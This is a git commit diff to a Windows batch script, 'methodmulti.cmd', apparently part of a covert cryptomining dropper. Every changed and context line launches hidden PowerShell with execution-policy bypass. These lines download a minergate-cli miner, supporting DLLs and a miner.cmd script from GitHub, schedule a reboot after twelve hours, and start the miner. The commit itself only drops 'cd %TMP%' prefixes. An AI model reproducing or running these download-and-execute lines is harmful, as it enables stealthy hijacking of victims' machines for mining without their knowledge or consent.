9b598e4f42415bc761f7de2426ed54323510589f
mediatui <57651467+mediatui@users.noreply.github.com>
2019-11-28 16:34:41 +1300

    Update methodmulti.cmd

--- multi/methodmulti.cmd
+++ multi/methodmulti.cmd
@@ -1,4 +1,4 @@
-cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/master/multi/minergate-cli.exe
+powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/master/multi/minergate-cli.exe
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/miner.cmd
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/msvcp140.dll
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc64_92.dll
@@ -6,4 +6,4 @@ powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercon
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/OpenCL.dll
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/vcruntime140.dll
 powershell -W Hidden -Exec Bypass cmd.exe /c shutdown /r /t 43200
-cd %TMP% & powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
+powershell -W Hidden -Exec Bypass cmd.exe /c miner.cmd
